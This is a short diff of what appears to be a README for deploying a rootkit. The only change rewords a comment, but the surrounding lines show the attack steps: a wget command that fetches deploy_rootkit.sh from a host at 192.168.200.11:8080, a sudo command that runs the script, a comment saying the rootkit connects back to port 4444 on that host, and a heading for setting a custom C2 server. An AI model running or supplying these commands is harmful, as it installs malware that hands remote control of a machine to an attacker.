@@ -45,7 +45,7 @@ wget http://192.168.200.11:8080/deploy_rootkit.sh
 
 ### 2. Deploy Rootkit
 ```bash
-# Simple deployment (connects to 192.168.200.11:4444)
+# Basic deployment (connects to 192.168.200.11:4444)
 sudo ./deploy_rootkit.sh
 
 # Custom C2 server
